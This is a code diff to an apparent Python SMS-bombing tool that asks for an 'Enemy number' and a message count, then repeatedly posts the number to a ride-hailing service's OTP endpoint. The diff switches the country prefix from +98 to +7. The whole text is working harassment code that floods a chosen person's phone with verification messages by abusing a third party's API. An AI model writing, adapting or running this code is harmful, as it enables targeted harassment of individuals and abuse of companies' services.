@@ -59,7 +59,7 @@ def start():
     clear()
     logo()
     print("\n\n")
-    phone_number = str(input("[+] Enemy number:\n>>+98 "))
+    phone_number = str(input("[+] Enemy number:\n>>+7 "))
     sms_number = int(input("[+] Number of sms:\n>>"))
 
     while looping_count <= sms_number:
@@ -106,7 +106,7 @@ def start():
 # 001 snap
 def snap(phone_number):
     try:
-        phone_number = "+98" + phone_number
+        phone_number = "+7" + phone_number
         data = {"cellphone":phone_number}
         url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
         p = post(url, json=data, timeout=2)
